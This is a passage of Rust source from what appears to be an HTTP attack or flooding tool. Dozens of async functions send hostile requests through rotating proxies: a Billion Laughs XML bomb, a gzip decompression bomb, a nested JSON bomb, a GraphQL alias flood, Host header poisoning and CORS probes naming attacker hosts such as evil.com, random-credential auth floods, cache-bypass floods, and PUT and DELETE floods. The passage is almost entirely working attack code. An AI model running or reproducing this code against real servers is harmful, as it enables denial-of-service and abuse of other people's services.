    let (scheme, creds): (&str, &str) = {
        let mut rng = rand::rng();
        let i = rng.random_range(0..5usize);
        [("Basic", "YWRtaW46YWRtaW4="), ("Bearer", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"), ("Digest", "username=\"admin\", realm=\"test\", nonce=\"abc123\", uri=\"/\", response=\"abc123\""), ("Bearer", "invalid-token-format-with-spaces"), ("Basic", "dGVzdDp0ZXN0MTIz")][i]
    };
    if verbose { println!("[VERBOSE] fetch_authflood: GET {} (proxy #{}) — Authorization: {} {}", url, proxy_idx, scheme, &creds[..20.min(creds.len())]); }
    let resp = send_with_retry(c.get(&url).header("Authorization", format!("{} {}", scheme, creds)).header("User-Agent", "Mozilla/5.0 (compatible; AuthFlood/1.0)"), max_retries, "fetch_authflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_cachebypass(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (pragma, cache_ctrl): (&str, &str) = {
        let mut rng = rand::rng();
        let i = rng.random_range(0..6usize);
        [("no-cache", "no-cache"), ("no-cache", "no-store, must-revalidate"), ("", "private, no-cache, no-store, max-age=0"), ("", "no-transform, no-cache"), ("no-cache", "max-age=0, must-revalidate"), ("", "only-if-cached")][i]
    };
    if verbose { println!("[VERBOSE] fetch_cachebypass: GET {} (proxy #{}) — Pragma: {}, Cache-Control: {}", url, proxy_idx, pragma, cache_ctrl); }
    let mut builder = c.get(&url);
    if !pragma.is_empty() { builder = builder.header("Pragma", pragma); }
    let resp = send_with_retry(builder.header("Cache-Control", cache_ctrl).header("User-Agent", "Mozilla/5.0 (compatible; CacheBypass/1.0)"), max_retries, "fetch_cachebypass").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_formmulti(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let boundary = format!("----FormBoundary{:08x}", rand::random::<u32>());
    let mut body = String::new();
    for i in 0..50 {
        body.push_str(&format!("--{}\r\nContent-Disposition: form-data; name=\"field{}\"\r\n\r\nvalue{} with some random padding {:08x}\r\n", boundary, i, i, rand::random::<u32>()));
    }
    body.push_str(&format!("--{}--\r\n", boundary));
    if verbose { println!("[VERBOSE] fetch_formmulti: POST {} (proxy #{}) — multipart form, 50 fields, {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", format!("multipart/form-data; boundary={}", boundary)).body(body).header("User-Agent", "Mozilla/5.0 (compatible; FormMulti/1.0)"), max_retries, "fetch_formmulti").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_xmlbomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // Billion Laughs attack
    let body = String::from("<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n]>\n<root>&lol6;</root>");
    if verbose { println!("[VERBOSE] fetch_xmlbomb: POST {} (proxy #{}) — XML bomb ({})", url, proxy_idx, if body.len() > 60 { "Billion Laughs" } else { "standard" }); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/xml").body(body).header("User-Agent", "Mozilla/5.0 (compatible; XmlBomb/1.0)"), max_retries, "fetch_xmlbomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_graphqlflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = r#"{"query":"query { __typename
    a: __typename
    b: __typename
    c: __typename
    d: __typename
    e: __typename
    f: __typename
    g: __typename
    h: __typename
    i: __typename
    j: __typename
    k: __typename
    l: __typename
    m: __typename
    n: __typename
    o: __typename
    p: __typename
    q: __typename
    r: __typename
    s: __typename
    t: __typename
  }"}"#;
    if verbose { println!("[VERBOSE] fetch_graphqlflood: POST {} (proxy #{}) — GraphQL alias flood ({} bytes)", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; GraphqlFlood/1.0)"), max_retries, "fetch_graphqlflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_redirectloop(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    // Disable redirect following so we see the 3xx response
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let path: String = { format!("redirect/{:08x}", rand::random::<u32>()) };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_redirectloop: GET {} (proxy #{}) — redirect chain test", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; RedirectLoop/1.0)"), max_retries, "fetch_redirectloop").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_emptybody(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_emptybody: POST {} (proxy #{}) — Content-Length: 0", url, proxy_idx); }
    let resp = send_with_retry(c.post(&url).header("Content-Length", "0").header("User-Agent", "Mozilla/5.0 (compatible; EmptyBody/1.0)"), max_retries, "fetch_emptybody").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_chunkedflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let chunks: Vec<String> = (0..100).map(|i| format!("{:x}\r\n{}\r\n", 32 + (i % 64), "A".repeat(32 + (i % 64)))).collect();
    let body = chunks.join("") + "0\r\n\r\n";
    if verbose { println!("[VERBOSE] fetch_chunkedflood: POST {} (proxy #{}) — chunked encoding, {} chunks", url, proxy_idx, 100); }
    let resp = send_with_retry(c.post(&url).header("Transfer-Encoding", "chunked").header("Content-Type", "text/plain").body(body).header("User-Agent", "Mozilla/5.0 (compatible; ChunkedFlood/1.0)"), max_retries, "fetch_chunkedflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_trailheaders(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // Build chunked body with trailing headers
    let body = "5\r\nHello\r\n5\r\nWorld\r\n0\r\nX-Trailing: value1\r\nX-Trailing-Data: some-trailing-metadata\r\n\r\n";
    if verbose { println!("[VERBOSE] fetch_trailheaders: POST {} (proxy #{}) — trailing headers", url, proxy_idx); }
    let resp = send_with_retry(c.post(&url).header("Transfer-Encoding", "chunked").header("TE", "trailers").body(body).header("User-Agent", "Mozilla/5.0 (compatible; TrailHeaders/1.0)"), max_retries, "fetch_trailheaders").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_connectionclose(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_connectionclose: GET {} (proxy #{}) — Connection: close", url, proxy_idx); }
    let resp = send_with_retry(c.get(&url).header("Connection", "close").header("User-Agent", "Mozilla/5.0 (compatible; ConnectionClose/1.0)"), max_retries, "fetch_connectionclose").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_expect100(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_expect100: POST {} (proxy #{}) — Expect: 100-continue", url, proxy_idx); }
    let resp = send_with_retry(c.post(&url).header("Expect", "100-continue").body("Waiting for handshake...").header("User-Agent", "Mozilla/5.0 (compatible; Expect100/1.0)"), max_retries, "fetch_expect100").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_varyflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (accept_enc, accept_lang) = {
        let mut rng = rand::rng();
        let encodings = ["gzip", "deflate", "br", "gzip, deflate", "br, gzip", "deflate, br;q=0.5", "gzip;q=1.0, br;q=0.3, deflate;q=0.1", "compress, gzip"];
        let langs = ["en-US", "en-GB", "nl-NL", "de-DE,en;q=0.7", "fr-FR,fr;q=0.9,en;q=0.5", "ja-JP", "zh-CN,zh;q=0.9,en;q=0.5", "es;q=1"];
        (encodings[rng.random_range(0..encodings.len())], langs[rng.random_range(0..langs.len())])
    };
    if verbose { println!("[VERBOSE] fetch_varyflood: GET {} (proxy #{}) — Accept-Encoding: {}, Accept-Language: {}", url, proxy_idx, accept_enc, accept_lang); }
    let resp = send_with_retry(c.get(&url).header("Accept-Encoding", accept_enc).header("Accept-Language", accept_lang).header("User-Agent", "Mozilla/5.0 (compatible; VaryFlood/1.0)"), max_retries, "fetch_varyflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_deflatebomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // Small payload that decompresses to many zeros (decompression bomb)
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;
    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    // Write many zeros that will compress very efficiently
    let zeros = vec![0u8; 65536];
    encoder.write_all(&zeros).unwrap();
    let compressed = encoder.finish().unwrap();
    if verbose { println!("[VERBOSE] fetch_deflatebomb: POST {} (proxy #{}) — deflate bomb: {} bytes -> {} bytes (decompresses to 64KB)", url, proxy_idx, compressed.len(), zeros.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Encoding", "gzip").header("Content-Type", "application/octet-stream").body(compressed).header("User-Agent", "Mozilla/5.0 (compatible; DeflateBomb/1.0)"), max_retries, "fetch_deflatebomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_traceamplify(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_traceamplify: TRACE {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.request(reqwest::Method::TRACE, &url).header("User-Agent", "Mozilla/5.0 (compatible; TraceAmplify/1.0)"), max_retries, "fetch_traceamplify").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_hostpoison(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let host = {
        let mut rng = rand::rng();
        let hosts = ["evil.com", "127.0.0.1", "localhost", "0.0.0.0", "10.0.0.1", "192.168.1.1", "internal.admin", "malicious.attacker.com", "xss.attacker.io", "host-unknown.local"];
        hosts[rng.random_range(0..hosts.len())]
    };
    if verbose { println!("[VERBOSE] fetch_hostpoison: GET {} (proxy #{}) — Host: {}", url, proxy_idx, host); }
    let resp = send_with_retry(c.get(&url).header("Host", host).header("User-Agent", "Mozilla/5.0 (compatible; HostPoison/1.0)"), max_retries, "fetch_hostpoison").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_conditionalflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (ims, inm) = {
        let mut rng = rand::rng();
        let dates = ["Mon, 01 Jan 2024 00:00:00 GMT", "Tue, 15 Feb 2022 12:30:00 GMT", "Wed, 20 Mar 2019 08:15:00 GMT", "Thu, 10 Jun 2021 23:59:59 GMT", "Fri, 25 Dec 2020 06:00:00 GMT"];
        let etags = ["\"abc123\"", "W/\"weak-etag\"", "\"strong-etag-v2\"", "\"0000001\"", "*"];
        (dates[rng.random_range(0..dates.len())], etags[rng.random_range(0..etags.len())])
    };
    if verbose { println!("[VERBOSE] fetch_conditionalflood: GET {} (proxy #{}) — If-Modified-Since: {}, If-None-Match: {}", url, proxy_idx, ims, inm); }
    let resp = send_with_retry(c.get(&url).header("If-Modified-Since", ims).header("If-None-Match", inm).header("User-Agent", "Mozilla/5.0 (compatible; ConditionalFlood/1.0)"), max_retries, "fetch_conditionalflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_corsflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let origin = {
        let mut rng = rand::rng();
        let origins = ["null", "https://evil.com", "https://attacker.org", "http://localhost:3000", "https://chrome-extension://abc123", "https://192.168.1.1:8080", "https://malicious.attacker.io", "https://subdomain.evil.com", "http://10.0.0.1", "null"];
        origins[rng.random_range(0..origins.len())]
    };
    if verbose { println!("[VERBOSE] fetch_corsflood: GET {} (proxy #{}) — Origin: {}", url, proxy_idx, origin); }
    let resp = send_with_retry(c.get(&url).header("Origin", origin).header("Access-Control-Request-Method", "GET").header("User-Agent", "Mozilla/5.0 (compatible; CorsFlood/1.0)"), max_retries, "fetch_corsflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_putflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = format!("PUT payload with test data {:08x}", rand::random::<u32>());
    if verbose { println!("[VERBOSE] fetch_putflood: PUT {} (proxy #{}) — body {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.put(&url).header("Content-Type", "text/plain").body(body).header("User-Agent", "Mozilla/5.0 (compatible; PutFlood/1.0)"), max_retries, "fetch_putflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_deleteflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_deleteflood: DELETE {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.delete(&url).header("User-Agent", "Mozilla/5.0 (compatible; DeleteFlood/1.0)"), max_retries, "fetch_deleteflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_sessionflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (cookie_name, cookie_val) = {
        let mut rng = rand::rng();
        let names = ["session_id", "sid", "PHPSESSID", "JSESSIONID", "connect.sid", "auth_token", "session", "csrf_token", "laravel_session", "XSRF-TOKEN"];
        (names[rng.random_range(0..names.len())], format!("deadaaaaa{:08x}{:08x}", rand::random::<u32>(), rand::random::<u32>()))
    };
    if verbose { println!("[VERBOSE] fetch_sessionflood: GET {} (proxy #{}) — Cookie: {}={}", url, proxy_idx, cookie_name, &cookie_val[..12]); }
    let resp = send_with_retry(c.get(&url).header("Cookie", format!("{}={}", cookie_name, cookie_val)).header("User-Agent", "Mozilla/5.0 (compatible; SessionFlood/1.0)"), max_retries, "fetch_sessionflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_contenttypeflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let ct = {
        let mut rng = rand::rng();
        let types = ["application/json", "application/xml", "text/plain", "application/x-www-form-urlencoded", "multipart/form-data; boundary=----test", "application/xhtml+xml", "text/html", "application/octet-stream", "application/graphql", "text/csv"];
        types[rng.random_range(0..types.len())]
    };
    if verbose { println!("[VERBOSE] fetch_contenttypeflood: POST {} (proxy #{}) — Content-Type: {}", url, proxy_idx, ct); }
    let body = format!("test body data {:08x}", rand::random::<u32>());
    let resp = send_with_retry(c.post(&url).header("Content-Type", ct).body(body).header("User-Agent", "Mozilla/5.0 (compatible; ContentTypeFlood/1.0)"), max_retries, "fetch_contenttypeflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_upgradeamplify(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (upgrade, conn) = {
        let mut rng = rand::rng();
        let upgrades = ["websocket", "h2c", "h2", "HTTP/2.0", "TLS/1.3", "Protobuf", "SSH", "IRC", "custom-protocol", "test/1.0"];
        let conns = ["Upgrade", "keep-alive, Upgrade", "close, Upgrade", "Upgrade, HTTP2-Settings", "Upgrade"];
        (upgrades[rng.random_range(0..upgrades.len())], conns[rng.random_range(0..conns.len())])
    };
    if verbose { println!("[VERBOSE] fetch_upgradeamplify: GET {} (proxy #{}) — Upgrade: {}, Connection: {}", url, proxy_idx, upgrade, conn); }
    let resp = send_with_retry(c.get(&url).header("Upgrade", upgrade).header("Connection", conn).header("User-Agent", "Mozilla/5.0 (compatible; UpgradeAmplify/1.0)"), max_retries, "fetch_upgradeamplify").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_headflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_headflood: HEAD {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.head(&url).header("User-Agent", "Mozilla/5.0 (compatible; HeadFlood/1.0)"), max_retries, "fetch_headflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_optionsflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_optionsflood: OPTIONS {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.request(reqwest::Method::OPTIONS, &url).header("Origin", "https://evil.com").header("Access-Control-Request-Method", "GET").header("User-Agent", "Mozilla/5.0 (compatible; OptionsFlood/1.0)"), max_retries, "fetch_optionsflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_patchflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = format!("{{\"op\": \"replace\", \"path\": \"/test\", \"value\": {:?}}}", rand::random::<u32>());
    if verbose { println!("[VERBOSE] fetch_patchflood: PATCH {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.request(reqwest::Method::PATCH, &url).header("Content-Type", "application/json-patch+json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; PatchFlood/1.0)"), max_retries, "fetch_patchflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_slowpost(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = format!("x={}&slow=yes&data={:08x}&padding={}", rand::random::<u32>(), rand::random::<u32>(), "A".repeat(512));
    if verbose { println!("[VERBOSE] fetch_slowpost: POST {} (proxy #{}) — slow POST {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/x-www-form-urlencoded").body(body).header("User-Agent", "Mozilla/5.0 (compatible; SlowPost/1.0)"), max_retries, "fetch_slowpost").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_jsonbomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // Deeply nested JSON bomb with many keys
    let body: String = {
        let mut result = String::from("{\"a\":{\"b\":{\"c\":{\"d\":{\"e\":{\"f\":{\"g\":{\"h\":{\"i\":{\"j\":{\"k\":{\"l\":{\"m\":{\"n\":{\"o\"");
        result.push_str(":{\"p\":{\"q\":{\"r\":{\"s\":{\"t\":{\"u\":{\"v\":{\"w\":{\"x\":{\"y\":{\"z\":{\"data\":\"value\"}}}}}}}}}}}}}}}}}}}}}}}}");
        for _ in 0..200 {
            result.push_str(&format!(",\"key{:08x}\":{{", rand::random::<u32>()));
        }
        result.push_str("\"end\":true");
        for _ in 0..200 {
            result.push('}');
        }
        result.push('}');
        result
    };
    if verbose { println!("[VERBOSE] fetch_jsonbomb: POST {} (proxy #{}) — deep JSON bomb {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; JsonBomb/1.0)"), max_retries, "fetch_jsonbomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_contentnegotiate(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let accept = {
        let mut rng = rand::rng();
        let types = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/plain;q=0.5", "text/csv,application/json;q=0.9,text/html;q=0.2", "application/xml;q=1,text/html;q=0.8,image/webp;q=0.5,*/*;q=0.1", "application/ld+json,application/json;q=0.5", "text/turtle,application/rdf+xml;q=0.7", "multipart/mixed;boundary=--boundary;q=0.9,text/plain;q=0.5"];
        types[rng.random_range(0..types.len())]
    };
    if verbose { println!("[VERBOSE] fetch_contentnegotiate: GET {} (proxy #{}) — Accept: {}", url, proxy_idx, accept); }
    let resp = send_with_retry(c.get(&url).header("Accept", accept).header("User-Agent", "Mozilla/5.0 (compatible; ContentNegotiate/1.0)"), max_retries, "fetch_contentnegotiate").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_preferflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let prefer = {
        let mut rng = rand::rng();
        let prefs = ["respond-async", "wait=10", "handling=strict", "handling=lenient", "respond-async, wait=60", "return=representation", "return=minimal", "respond-async, handling=lenient, wait=30"];
        prefs[rng.random_range(0..prefs.len())]
    };
    if verbose { println!("[VERBOSE] fetch_preferflood: GET {} (proxy #{}) — Prefer: {}", url, proxy_idx, prefer); }
    let resp = send_with_retry(c.get(&url).header("Prefer", prefer).header("User-Agent", "Mozilla/5.0 (compatible; PreferFlood/1.0)"), max_retries, "fetch_preferflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_rangeoverlap(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let range = {
